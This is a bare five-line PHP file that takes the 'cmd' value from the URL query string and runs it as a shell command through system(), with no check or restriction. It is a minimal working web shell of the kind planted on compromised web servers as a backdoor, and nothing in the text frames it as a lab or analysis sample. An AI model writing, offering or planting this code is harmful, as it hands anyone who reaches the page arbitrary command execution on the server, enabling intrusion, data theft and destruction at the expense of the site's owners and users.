<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
  }
?>